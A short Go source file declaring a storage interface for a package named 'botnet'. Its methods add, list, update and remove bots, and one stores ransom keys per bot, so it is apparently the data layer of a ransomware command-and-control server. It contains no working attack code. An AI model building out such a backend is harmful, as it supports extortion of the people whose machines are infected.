package botnet

//Storager is
type Storager interface {
	AddBot(b *Bot) (*Bot, error)
	RemoveBot(id []byte) error
	ListBots() ([]*Bot, error)
	GetBot(id []byte) (*Bot, error)
	UpdateBot(b *Bot) (*Bot, error)
	AddRansomKey(botID, key []byte) error
}
